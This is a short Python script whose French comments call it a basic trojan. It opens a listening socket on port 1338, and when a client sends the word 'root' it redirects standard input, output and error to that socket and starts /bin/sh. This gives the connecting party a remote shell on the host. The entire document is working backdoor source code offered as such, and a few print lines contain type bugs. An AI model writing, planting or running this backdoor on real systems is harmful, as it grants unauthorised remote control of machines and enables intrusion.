#!/usr/bin/env python
#--*-- coding:UTF-8 --*--
# trojan basique

import socket, os, code

host=''
port = 1338
mot=""
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((host,port))
s.listen(1)
client,adresse=s.accept()
print ("" + adresse)
print ("" + client.getpeername())
client.send("Bonjour à toi\n")
mot=client.recv(1024)
print ("" + mot)

while 1:
    if mot=="root\n": # Envoie du mot root au serveur
        print ("on est dans root")
        for f in range (3): # f va prendre les valeurs 0, 1 et 2 (canal0 =clavier, canal1=ecran, canal2=sortie d'erreur)
            os.dup2(client.fileno(), f) # f est un parametre de la fonction dup2 / f redirigé vers le socket client
        os.execl("/bin/sh", "/bin/sh") # lance le bash qui se retrouvera sur le socket
        code.interact() # interactivité entre le client et le serveur
        sys.exit()
    else:
        print ("on sort")
        break
client.close()
s.close()
